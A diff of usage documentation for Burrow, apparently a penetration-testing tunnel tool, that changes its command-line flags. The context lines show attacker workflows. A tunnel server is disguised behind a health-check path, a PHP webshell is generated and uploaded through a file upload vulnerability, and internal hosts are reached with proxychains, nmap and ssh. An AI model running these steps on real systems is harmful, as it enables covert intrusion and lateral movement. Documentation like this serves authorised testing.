@@ -395,20 +395,20 @@ This solves the egress-blocked scenario: the target has no outbound connectivity
 | Flag | Default | Description |
 |------|---------|-------------|
 | `--listen, -l` | `0.0.0.0:8080` | Listen address (host:port) |
-| `--key` | | Shared encryption/authentication key (enables XOR encryption + SHA256 X-Token auth) |
+| `--key, -k` | | Shared encryption/authentication key (enables XOR encryption + SHA256 X-Token auth) |
 | `--path` | `/b` | URL path for the tunnel endpoint |
 
 **Examples:**
 
 ```bash
 # Basic HTTP tunnel server (no encryption)
-burrow httptunnel server --listen 0.0.0.0:8080
+burrow httptunnel server -l 0.0.0.0:8080
 
 # With encryption and authentication
-burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret
+burrow httptunnel server -l 0.0.0.0:8080 -k s3cret
 
 # Custom path (blend in with existing app routes)
-burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret --path /api/health
+burrow httptunnel server -l 0.0.0.0:8080 -k s3cret --path /api/health
 ```
 
 **Expected output:**
@@ -434,21 +434,21 @@ HTTP tunnel client providing a local SOCKS5 proxy interface. Runs on the attacke
 
 | Flag | Default | Description |
 |------|---------|-------------|
-| `--url` | (required) | HTTP tunnel server URL (e.g. `http://target:8080/b`) |
-| `--socks` | `127.0.0.1:1080` | Local SOCKS5 listen address |
-| `--key` | | Shared encryption/authentication key (must match server) |
+| `--connect, -c` | (required) | HTTP tunnel server URL (e.g. `http://target:8080/b`) |
+| `--listen, -l` | `127.0.0.1:1080` | Local SOCKS5 listen address |
+| `--key, -k` | | Shared encryption/authentication key (must match server) |
 
 **Examples:**
 
 ```bash
 # Connect to a running httptunnel server
-burrow httptunnel client --url http://target:8080/b
+burrow httptunnel client -c http://target:8080/b
 
 # With encryption (key must match server)
-burrow httptunnel client --url http://target:8080/b --key s3cret
+burrow httptunnel client -c http://target:8080/b -k s3cret
 
 # Custom local SOCKS5 port
-burrow httptunnel client --url http://target:8080/b --key s3cret --socks 127.0.0.1:9050
+burrow httptunnel client -c http://target:8080/b -k s3cret -l 127.0.0.1:9050
 ```
 
 **Expected output:**
@@ -464,10 +464,10 @@ burrow httptunnel client --url http://target:8080/b --key s3cret --socks 127.0.0
 
 ```bash
 # On target (no outbound connectivity needed):
-burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret
+burrow httptunnel server -l 0.0.0.0:8080 -k s3cret
 
 # On attacker:
-burrow httptunnel client --url http://target:8080/b --key s3cret --socks 127.0.0.1:1080
+burrow httptunnel client -c http://target:8080/b -k s3cret -l 127.0.0.1:1080
 
 # Now route tools through the SOCKS5 proxy:
 proxychains ssh user@10.0.0.20
@@ -516,7 +516,7 @@ burrow generate webshell --format php --key s3cret -o tunnel.php
 # (via file upload vulnerability, FTP, SCP, CMS plugin, etc.)
 
 # Step 3: Connect with httptunnel client
-burrow httptunnel client --url http://target/tunnel.php --key s3cret --socks 127.0.0.1:1080
+burrow httptunnel client -c http://target/tunnel.php -k s3cret -l 127.0.0.1:1080
 
 # Step 4: Route tools through the SOCKS5 proxy
 proxychains nmap -sT -Pn 10.10.10.0/24
@@ -893,10 +893,10 @@ proxychains nmap -sT -p 22,80,443 10.0.0.0/24
 
 # Option A: Deploy Burrow binary on target
 # On target:
-burrow httptunnel server --listen 0.0.0.0:8080 --key s3cret
+burrow httptunnel server -l 0.0.0.0:8080 -k s3cret
 
 # On attacker:
-burrow httptunnel client --url http://target:8080/b --key s3cret --socks 127.0.0.1:1080
+burrow httptunnel client -c http://target:8080/b -k s3cret -l 127.0.0.1:1080
 proxychains nmap -sT -Pn 10.10.10.0/24
 
 # Option B: Upload a webshell instead of a binary
@@ -905,7 +905,7 @@ burrow generate webshell --format php --key s3cret -o tunnel.php
 # Upload tunnel.php to target web root
 
 # On attacker:
-burrow httptunnel client --url http://target/tunnel.php --key s3cret --socks 127.0.0.1:1080
+burrow httptunnel client -c http://target/tunnel.php -k s3cret -l 127.0.0.1:1080
 proxychains nmap -sT -Pn 10.10.10.0/24
 ```
 
